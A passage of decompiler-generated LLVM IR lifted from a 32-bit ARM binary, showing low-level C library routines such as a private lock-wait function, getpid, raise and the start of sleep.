  %v3_14330 = icmp uge i32 %v0_1433c, %v1_14330
  store i1 %v3_14330, i1* %cpsr_c.global-to-local, align 1
  %v9_14330 = icmp eq i32 %v0_1433c, %v1_14330
  store i32 %v0_1433c, i32* %r2.global-to-local, align 4
  br i1 %v9_14330, label %dec_label_pc_1433c, label %dec_label_pc_14330.dec_label_pc_142fc_crit_edge

dec_label_pc_14330.dec_label_pc_142fc_crit_edge:  ; preds = %dec_label_pc_14330
  %v0_142fc.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_14300.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_142fc

dec_label_pc_1433c:                               ; preds = %dec_label_pc_14330
  %v2_1433c = icmp ne i32 %v1_14330, 0
  store i1 %v2_1433c, i1* %cpsr_c.global-to-local, align 1
  %v7_1433c = icmp eq i32 %v1_14330, 1
  %v0_14344 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_1433c, label %dec_label_pc_14344, label %dec_label_pc_14368

dec_label_pc_14344:                               ; preds = %dec_label_pc_1433c
  %v1_14344 = inttoptr i32 %v0_14344 to i32*
  %v2_14344 = load i32, i32* %v1_14344, align 4
  store i32 %v2_14344, i32* @r1, align 4
  %v1_14348 = add i32 %v2_14344, 24
  %v2_14348 = inttoptr i32 %v1_14348 to i32*
  %v3_14348 = load i32, i32* %v2_14348, align 4
  store i32 %v3_14348, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1434c = icmp eq i32 %v3_14348, 0
  br i1 %v2_1434c, label %dec_label_pc_14368, label %dec_label_pc_14354

dec_label_pc_14354:                               ; preds = %dec_label_pc_14344
  %v1_14354 = add i32 %v2_14344, 20
  %v2_14354 = inttoptr i32 %v1_14354 to i32*
  %v3_14354 = load i32, i32* %v2_14354, align 4
  store i32 %v3_14354, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14368

dec_label_pc_14368:                               ; preds = %dec_label_pc_1433c, %dec_label_pc_14354, %dec_label_pc_14344
  %v1_14368 = add i32 %v0_14344, 4
  %v2_14368 = inttoptr i32 %v1_14368 to i32*
  %v3_14368 = load i32, i32* %v2_14368, align 4
  store i32 %v3_14368, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1436c = icmp eq i32 %v3_14368, 0
  br i1 %v2_1436c, label %dec_label_pc_14374, label %dec_label_pc_142e0

dec_label_pc_1436cthread-pre-split:               ; preds = %dec_label_pc_142c4, %dec_label_pc_142bc, %dec_label_pc_1425c
  %v0_1436c.pr = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1436c11 = icmp eq i32 %v0_1436c.pr, 0
  br i1 %v2_1436c11, label %dec_label_pc_14374, label %dec_label_pc_142e0

dec_label_pc_14374:                               ; preds = %dec_label_pc_14368, %dec_label_pc_1436cthread-pre-split
  %v0_14374.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_14374.pre, i32* %r0.global-to-local, align 4
  ret i32 %v0_14374.pre

; uselistorder directives
  uselistorder i32 %v0_1436c.pr, { 1, 0 }
  uselistorder i32 %v3_14368, { 1, 2, 0 }
  uselistorder i32 %v1_14330, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1432c, { 1, 0, 2 }
  uselistorder i32 %v1_14310.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_142b0, { 1, 0, 2 }
  uselistorder i32 %v1_14294.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14284, { 1, 0 }
  uselistorder i32 %v0_14128, { 1, 0, 2 }
  uselistorder i32 %v1_1410c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_140e4, { 2, 1, 0, 3 }
  uselistorder i32 %v0_140bc, { 1, 0, 2 }
  uselistorder i32 %v1_140a0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_14068, { 1, 0, 2 }
  uselistorder i32 %v0_14048, { 1, 0, 2 }
  uselistorder i32 %v1_1402c.pre, { 0, 3, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 14, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 13, 12, 0 }
  uselistorder i32* %r6.global-to-local, { 3, 7, 5, 6, 4, 0, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 8, 7, 9, 10, 12, 11, 13, 14, 16, 15, 17 }
  uselistorder i32* %r3.global-to-local, { 34, 5, 6, 8, 7, 0, 9, 10, 11, 12, 14, 13, 1, 15, 16, 17, 18, 19, 20, 21, 23, 22, 2, 24, 25, 26, 28, 27, 3, 29, 30, 32, 31, 4, 33 }
  uselistorder i32* %r0.global-to-local, { 12, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 13, 7, 8, 9, 11, 10, 2, 12, 14, 15, 17, 16, 3, 18, 19, 21, 20, 4, 22, 23, 25, 24, 5, 26, 27, 28, 30, 29, 6, 32, 31, 1 }
  uselistorder i32 108, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_14374, { 1, 0 }
  uselistorder label %dec_label_pc_14368, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14330, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14318, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_142b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1429c, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_1412c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14114, { 1, 0 }
  uselistorder label %dec_label_pc_140c0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_140a8, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_1404c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14034, { 1, 0 }
  uselistorder label %dec_label_pc_140d0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_14000, { 1, 0 }
}

define i32 @__lll_lock_wait_private(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_143ac = load i32, i32* @r4, align 4
  store i32 %v3_143ac, i32* %stack_var_-16, align 4
  %v0_143b0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_143b0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_143b4

dec_label_pc_143b4:                               ; preds = %dec_label_pc_14434.dec_label_pc_143b4_crit_edge, %entry
  %v0_143b8 = phi i32 [ %v0_143b8.pre, %dec_label_pc_14434.dec_label_pc_143b4_crit_edge ], [ %v0_143b0, %entry ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_143b8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v1_143c017 = inttoptr i32 %v0_143b8 to i32*
  %v2_143c018 = load i32, i32* %v1_143c017, align 4
  %v3_143c420 = icmp ne i32 %v2_143c018, 0
  store i1 %v3_143c420, i1* %cpsr_c.global-to-local, align 1
  %v9_143c426 = icmp eq i32 %v2_143c018, 1
  br i1 %v9_143c426, label %dec_label_pc_143cc, label %dec_label_pc_143e4

dec_label_pc_143cc:                               ; preds = %dec_label_pc_143b4, %dec_label_pc_143cc.dec_label_pc_143c0_crit_edge
  %v0_143cc27 = phi i32 [ %v1_143c4.pre, %dec_label_pc_143cc.dec_label_pc_143c0_crit_edge ], [ 1, %dec_label_pc_143b4 ]
  store i32 %v0_143cc27, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_143dc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_143dc, label %dec_label_pc_143e0, label %dec_label_pc_143cc.dec_label_pc_143c0_crit_edge

dec_label_pc_143cc.dec_label_pc_143c0_crit_edge:  ; preds = %dec_label_pc_143cc
  %v0_143c0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_143c4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_143c0 = inttoptr i32 %v0_143c0.pre to i32*
  %v2_143c0 = load i32, i32* %v1_143c0, align 4
  %v3_143c4 = icmp uge i32 %v2_143c0, %v1_143c4.pre
  store i1 %v3_143c4, i1* %cpsr_c.global-to-local, align 1
  %v9_143c4 = icmp eq i32 %v2_143c0, %v1_143c4.pre
  br i1 %v9_143c4, label %dec_label_pc_143cc, label %dec_label_pc_143e4

dec_label_pc_143e0:                               ; preds = %dec_label_pc_143cc
  %v0_143e0 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_143e4

dec_label_pc_143e4:                               ; preds = %dec_label_pc_143b4, %dec_label_pc_143cc.dec_label_pc_143c0_crit_edge, %dec_label_pc_143e0
  %v0_143e4 = phi i32 [ %v0_143e0, %dec_label_pc_143e0 ], [ %v2_143c018, %dec_label_pc_143b4 ], [ %v2_143c0, %dec_label_pc_143cc.dec_label_pc_143c0_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_143e4 = icmp eq i32 %v0_143e4, 0
  %v0_14408.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_143e4, label %dec_label_pc_14404, label %dec_label_pc_143ec

dec_label_pc_143ec:                               ; preds = %dec_label_pc_143e4
  store i32 %v0_14408.pre, i32* %r0.global-to-local, align 4
  %v0_143f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_143f0 = add i32 %v0_143f0, 126
  store i32 %v1_143f0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14404

dec_label_pc_14404:                               ; preds = %dec_label_pc_143e4, %dec_label_pc_143ec
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_14408.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1441028 = inttoptr i32 %v0_14408.pre to i32*
  %v2_1441029 = load i32, i32* %v1_1441028, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1441436 = icmp eq i32 %v2_1441029, 0
  br i1 %v9_1441436, label %dec_label_pc_1441c, label %dec_label_pc_14434

dec_label_pc_1441c:                               ; preds = %dec_label_pc_14404, %dec_label_pc_1441c.dec_label_pc_14410_crit_edge
  %v0_1441c37 = phi i32 [ %v1_14414.pre, %dec_label_pc_1441c.dec_label_pc_14410_crit_edge ], [ 0, %dec_label_pc_14404 ]
  store i32 %v0_1441c37, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1442c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1442c, label %dec_label_pc_14430, label %dec_label_pc_1441c.dec_label_pc_14410_crit_edge

dec_label_pc_1441c.dec_label_pc_14410_crit_edge:  ; preds = %dec_label_pc_1441c
  %v0_14410.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14414.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14410 = inttoptr i32 %v0_14410.pre to i32*
  %v2_14410 = load i32, i32* %v1_14410, align 4
  %v3_14414 = icmp uge i32 %v2_14410, %v1_14414.pre
  store i1 %v3_14414, i1* %cpsr_c.global-to-local, align 1
  %v9_14414 = icmp eq i32 %v2_14410, %v1_14414.pre
  br i1 %v9_14414, label %dec_label_pc_1441c, label %dec_label_pc_14434

dec_label_pc_14430:                               ; preds = %dec_label_pc_1441c
  %v0_14430 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14434

dec_label_pc_14434:                               ; preds = %dec_label_pc_14404, %dec_label_pc_1441c.dec_label_pc_14410_crit_edge, %dec_label_pc_14430
  %v0_14434 = phi i32 [ %v0_14430, %dec_label_pc_14430 ], [ %v2_1441029, %dec_label_pc_14404 ], [ %v2_14410, %dec_label_pc_1441c.dec_label_pc_14410_crit_edge ]
  %v1_14434 = phi i32 [ %v0_14430, %dec_label_pc_14430 ], [ 0, %dec_label_pc_14404 ], [ %v1_14414.pre, %dec_label_pc_1441c.dec_label_pc_14410_crit_edge ]
  %v3_14434 = icmp uge i32 %v0_14434, %v1_14434
  store i1 %v3_14434, i1* %cpsr_c.global-to-local, align 1
  %v9_14434 = icmp eq i32 %v0_14434, %v1_14434
  br i1 %v9_14434, label %dec_label_pc_1443c, label %dec_label_pc_14434.dec_label_pc_143b4_crit_edge

dec_label_pc_14434.dec_label_pc_143b4_crit_edge:  ; preds = %dec_label_pc_14434
  %v0_143b8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_143b4

dec_label_pc_1443c:                               ; preds = %dec_label_pc_14434
  %v2_1443c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1443c, i32* %r4.global-to-local, align 4
  %v1_14440 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_14440

; uselistorder directives
  uselistorder i32 %v0_14430, { 1, 0 }
  uselistorder i32 %v1_14414.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_143c4.pre, { 2, 1, 0 }
  uselistorder i32 %v2_143c018, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 4, 3, 1, 5, 7, 6, 0 }
  uselistorder i32 126, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14434, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1441c, { 1, 0 }
  uselistorder label %dec_label_pc_14404, { 1, 0 }
  uselistorder label %dec_label_pc_143e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_143cc, { 1, 0 }
}

define i32 @__getpid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14444 = load i32, i32* @r7, align 4
  store i32 %v3_14444, i32* %stack_var_-8, align 4
  %v0_14448 = call i32 @__aeabi_read_tp()
  store i32 %v0_14448, i32* %r0.global-to-local, align 4
  %v1_1444c = add i32 %v0_14448, -1060
  %v2_1444c = inttoptr i32 %v1_1444c to i32*
  %v3_1444c = load i32, i32* %v2_1444c, align 4
  %tmp7 = icmp slt i32 %v3_1444c, 1
  br i1 %tmp7, label %dec_label_pc_1445c, label %dec_label_pc_14480

dec_label_pc_1445c:                               ; preds = %entry
  %v2_14450 = icmp eq i32 %v3_1444c, 0
  br i1 %v2_14450, label %dec_label_pc_14460, label %dec_label_pc_1446c

dec_label_pc_14460:                               ; preds = %dec_label_pc_1445c
  %v1_14460 = add i32 %v0_14448, -1064
  %v2_14460 = inttoptr i32 %v1_14460 to i32*
  %v3_14460 = load i32, i32* %v2_14460, align 4
  store i32 %v3_14460, i32* %r0.global-to-local, align 4
  %v2_14464 = icmp eq i32 %v3_14460, 0
  br i1 %v2_14464, label %bb, label %bb8

dec_label_pc_1446c:                               ; preds = %dec_label_pc_1445c
  br label %bb8

bb:                                               ; preds = %dec_label_pc_14460
  store i32 0, i32* %v2_14460, align 4
  %v0_1447c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_1446c, %dec_label_pc_14460, %bb
  %v0_1447c = phi i32 [ %v3_14460, %dec_label_pc_14460 ], [ %v0_14448, %dec_label_pc_1446c ], [ %v0_1447c.pre, %bb ]
  br label %dec_label_pc_14480

dec_label_pc_14480:                               ; preds = %entry, %bb8
  %v0_14480 = phi i32 [ %v3_1444c, %entry ], [ %v0_1447c, %bb8 ]
  store i32 %v0_14480, i32* %r0.global-to-local, align 4
  %v2_14484 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14484, i32* @r7, align 4
  ret i32 %v0_14480

; uselistorder directives
  uselistorder i32 %v0_14480, { 1, 0 }
  uselistorder i32 %v3_1444c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14480, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1448c = load i32, i32* @r4, align 4
  store i32 %v3_1448c, i32* %stack_var_-20, align 4
  %v0_14494 = call i32 @__aeabi_read_tp()
  store i32 %v0_14494, i32* %r0.global-to-local, align 4
  %v1_14498 = add i32 %v0_14494, -1064
  %v2_14498 = inttoptr i32 %v1_14498 to i32*
  %v3_14498 = load i32, i32* %v2_14498, align 4
  store i32 %v3_14498, i32* %r4.global-to-local, align 4
  %v2_1449c = icmp eq i32 %v3_14498, 0
  %v1_144a4 = add i32 %v0_14494, -1060
  %v2_144a4 = inttoptr i32 %v1_144a4 to i32*
  %v3_144a4 = load i32, i32* %v2_144a4, align 4
  store i32 %v3_144a4, i32* %r0.global-to-local, align 4
  br i1 %v2_1449c, label %dec_label_pc_144ac, label %dec_label_pc_144c0

dec_label_pc_144ac:                               ; preds = %entry
  store i32 %v3_144a4, i32* %r4.global-to-local, align 4
  store i32 %v3_144a4, i32* %v2_14498, align 4
  %v0_144e8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_144c0:                               ; preds = %entry
  %v5_144c4 = icmp sgt i32 %v3_144a4, 0
  br i1 %v5_144c4, label %bb28, label %dec_label_pc_144c8

dec_label_pc_144c8:                               ; preds = %dec_label_pc_144c0
  %tmp = bitcast i32 %v3_144a4 to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_144c8 = bitcast float %tmp30 to i32
  %v2_144cc = icmp eq i32 %v1_144c8, 0
  br i1 %v2_144cc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_144c8
  store i32 %v3_14498, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_144c8
  %v2_144d4 = sub i32 0, %v3_144a4
  store i32 %v2_144d4, i32* %r0.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %bb, %dec_label_pc_144c0, %dec_label_pc_144ac, %.thread
  %v0_144ec = phi i32 [ %v3_144a4, %dec_label_pc_144c0 ], [ %v0_144e8.pre, %dec_label_pc_144ac ], [ %v3_14498, %bb ], [ %v2_144d4, %.thread ]
  store i32 %v0_144ec, i32* %r2.global-to-local, align 4
  %tmp31 = icmp ult i32 %v0_144ec, -4095
  br i1 %tmp31, label %dec_label_pc_14510, label %dec_label_pc_144f8

dec_label_pc_144f8:                               ; preds = %bb28
  %v0_144fc = call i32 @__aeabi_read_tp()
  %v3_14500 = load i16, i16* @global_var_22068.345, align 2
  %v4_14500 = sext i16 %v3_14500 to i32
  %v0_14504 = load i32, i32* %r2.global-to-local, align 4
  %v1_14504 = sub i32 0, %v0_14504
  store i32 %v1_14504, i32* %r2.global-to-local, align 4
  %v3_14508 = add i32 %v4_14500, %v0_144fc
  %v4_14508 = inttoptr i32 %v3_14508 to i32*
  store i32 %v1_14504, i32* %v4_14508, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14510

dec_label_pc_14510:                               ; preds = %bb28, %dec_label_pc_144f8
  %v0_14514 = phi i32 [ %v0_144ec, %bb28 ], [ -1, %dec_label_pc_144f8 ]
  %v3_14510 = icmp eq i32 %v0_14514, -1
  store i32 %v0_14514, i32* %r5.global-to-local, align 4
  br i1 %v3_14510, label %dec_label_pc_1451c, label %dec_label_pc_14564

dec_label_pc_1451c:                               ; preds = %dec_label_pc_14510
  %v0_14520 = call i32 @__aeabi_read_tp()
  store i32 %v0_14520, i32* %r0.global-to-local, align 4
  %v3_14524 = load i16, i16* @global_var_22068.345, align 2
  %v4_14524 = sext i16 %v3_14524 to i32
  %v2_14528 = add i32 %v4_14524, %v0_14520
  %v3_14528 = inttoptr i32 %v2_14528 to i32*
  %v4_14528 = load i32, i32* %v3_14528, align 4
  %v7_1452c = icmp eq i32 %v4_14528, 38
  br i1 %v7_1452c, label %dec_label_pc_14538, label %dec_label_pc_1451c.dec_label_pc_14564_crit_edge

dec_label_pc_1451c.dec_label_pc_14564_crit_edge:  ; preds = %dec_label_pc_1451c
  %v0_14564.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14564

dec_label_pc_14538:                               ; preds = %dec_label_pc_1451c
  %v0_14538 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14538, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_14538, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_14538
  %v5_14550 = sub i32 0, %v0_14538
  store i32 %v5_14550, i32* %r2.global-to-local, align 4
  %v7_14554 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1455c.517 to i32), i32 56076) to i32*), align 4
  %v4_14558 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_14558, i32* %r0.global-to-local, align 4
  %v7_1455c = add i32 %v7_14554, %v0_14520
  %v8_1455c = inttoptr i32 %v7_1455c to i32*
  store i32 %v5_14550, i32* %v8_1455c, align 4
  %v0_14560.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_14538, %bb29
  %v0_14560 = phi i32 [ %v0_14560.pre, %bb29 ], [ %v0_14538, %dec_label_pc_14538 ]
  store i32 %v0_14560, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14564

dec_label_pc_14564:                               ; preds = %dec_label_pc_1451c.dec_label_pc_14564_crit_edge, %dec_label_pc_14510, %.thread22
  %v0_14564 = phi i32 [ %v0_14564.pre, %dec_label_pc_1451c.dec_label_pc_14564_crit_edge ], [ %v0_14514, %dec_label_pc_14510 ], [ %v0_14560, %.thread22 ]
  store i32 %v0_14564, i32* %r0.global-to-local, align 4
  %v2_14568 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_14568, i32* @r4, align 4
  ret i32 %v0_14564

; uselistorder directives
  uselistorder i32 %v0_14564, { 1, 0 }
  uselistorder i32 %v0_14538, { 1, 2, 0, 3 }
  uselistorder i32 %v0_144ec, { 2, 0, 1 }
  uselistorder i32 %v3_144a4, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 38, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 -1060, { 1, 0 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_14564, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_14510, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_1457c = load i32, i32* @r4, align 4
  %v6_1457c = load i32, i32* @r5, align 4
  %v9_1457c = load i32, i32* @r6, align 4
  %v12_1457c = load i32, i32* @r7, align 4
  %v15_1457c = load i32, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1458c = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* @r7, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  br i1 %v2_1458c, label %dec_label_pc_145a0, label %dec_label_pc_14614

dec_label_pc_145a0:                               ; preds = %entry
  %v0_145a0 = call i32 @__aeabi_read_tp()
  %v1_145a4 = add i32 %v0_145a0, -1036
  %v2_145a4 = inttoptr i32 %v1_145a4 to i32*
  %v3_145a4 = load i32, i32* %v2_145a4, align 4
  %v1_145a8 = and i32 %v3_145a4, -71
  %v2_145ac = icmp ugt i32 %v1_145a8, 7
  store i1 %v2_145ac, i1* %cpsr_c.global-to-local, align 1
  %v7_145ac = icmp eq i32 %v1_145a8, 8
  %v1_145b0 = add i32 %v0_145a0, -1168
  store i32 %v1_145b0, i32* @r5, align 4
  br i1 %v7_145ac, label %dec_label_pc_145b8, label %dec_label_pc_1468c

dec_label_pc_145b8:                               ; preds = %dec_label_pc_145a0
  %v2_145bc = add i32 %v0_145a0, -624
  %v3_145bc = inttoptr i32 %v2_145bc to i32*
  store i32 -1, i32* %v3_145bc, align 4
  %v0_145c0 = load i32, i32* @r5, align 4
  %v1_145c0 = add i32 %v0_145c0, 132
  store i32 %v1_145c0, i32* @r6, align 4
  br label %dec_label_pc_145c4

dec_label_pc_145c4:                               ; preds = %dec_label_pc_145f8.dec_label_pc_145c4_crit_edge, %dec_label_pc_145b8
  %v0_145c8 = phi i32 [ %v0_145c8.pre, %dec_label_pc_145f8.dec_label_pc_145c4_crit_edge ], [ %v1_145c0, %dec_label_pc_145b8 ]
  %v0_145c4 = phi i32 [ %v0_14600, %dec_label_pc_145f8.dec_label_pc_145c4_crit_edge ], [ %v0_145c0, %dec_label_pc_145b8 ]
  %v1_145c4 = add i32 %v0_145c4, 132
  %v2_145c4 = inttoptr i32 %v1_145c4 to i32*
  %v3_145c4 = load i32, i32* %v2_145c4, align 4
  store i32 %v0_145c8, i32* %r2.global-to-local, align 4
  store i32 %v3_145c4, i32* @r4, align 4
  %v1_145d430 = inttoptr i32 %v0_145c8 to i32*
  %v2_145d431 = load i32, i32* %v1_145d430, align 4
  %v3_145d833 = icmp uge i32 %v2_145d431, %v3_145c4
  store i1 %v3_145d833, i1* %cpsr_c.global-to-local, align 1
  %v9_145d839 = icmp eq i32 %v2_145d431, %v3_145c4
  br i1 %v9_145d839, label %dec_label_pc_145e0, label %dec_label_pc_145f8

dec_label_pc_145e0:                               ; preds = %dec_label_pc_145c4, %dec_label_pc_145e0.dec_label_pc_145d4_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_145f0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_145f0, label %dec_label_pc_145f4, label %dec_label_pc_145e0.dec_label_pc_145d4_crit_edge

dec_label_pc_145e0.dec_label_pc_145d4_crit_edge:  ; preds = %dec_label_pc_145e0
  %v0_145d4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_145d8.pre = load i32, i32* @r4, align 4
  %v1_145d4 = inttoptr i32 %v0_145d4.pre to i32*
  %v2_145d4 = load i32, i32* %v1_145d4, align 4
  %v3_145d8 = icmp uge i32 %v2_145d4, %v1_145d8.pre
  store i1 %v3_145d8, i1* %cpsr_c.global-to-local, align 1
  %v9_145d8 = icmp eq i32 %v2_145d4, %v1_145d8.pre
  br i1 %v9_145d8, label %dec_label_pc_145e0, label %dec_label_pc_145f8

dec_label_pc_145f4:                               ; preds = %dec_label_pc_145e0
  %v0_145f4 = load i32, i32* @r4, align 4
  br label %dec_label_pc_145f8

dec_label_pc_145f8:                               ; preds = %dec_label_pc_145c4, %dec_label_pc_145e0.dec_label_pc_145d4_crit_edge, %dec_label_pc_145f4
  %v0_145f8 = phi i32 [ %v0_145f4, %dec_label_pc_145f4 ], [ %v2_145d431, %dec_label_pc_145c4 ], [ %v2_145d4, %dec_label_pc_145e0.dec_label_pc_145d4_crit_edge ]
  %v1_145f8 = phi i32 [ %v0_145f4, %dec_label_pc_145f4 ], [ %v3_145c4, %dec_label_pc_145c4 ], [ %v1_145d8.pre, %dec_label_pc_145e0.dec_label_pc_145d4_crit_edge ]
  %v3_145f8 = icmp uge i32 %v0_145f8, %v1_145f8
  store i1 %v3_145f8, i1* %cpsr_c.global-to-local, align 1
  %v9_145f8 = icmp eq i32 %v0_145f8, %v1_145f8
  br i1 %v9_145f8, label %dec_label_pc_14600, label %dec_label_pc_145f8.dec_label_pc_145c4_crit_edge

dec_label_pc_145f8.dec_label_pc_145c4_crit_edge:  ; preds = %dec_label_pc_145f8
  %v0_14600 = load i32, i32* @r5, align 4
  %v0_145c8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_145c4

dec_label_pc_14600:                               ; preds = %dec_label_pc_145f8
  %v0_14608 = load i32, i32* @r7, align 4
  %v2_14608 = add i32 %v0_14608, 116
  %v3_14608 = inttoptr i32 %v2_14608 to i32*
  %v4_14608 = load i32, i32* %v3_14608, align 4
  store i32 83476, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14608)
  %v0_1461c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14614

dec_label_pc_14614:                               ; preds = %entry, %dec_label_pc_14600
  %v0_1461c = phi i32 [ 0, %entry ], [ %v0_1461c.pre, %dec_label_pc_14600 ]
  %v2_14620 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_14620, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %stack_var_-40, align 4
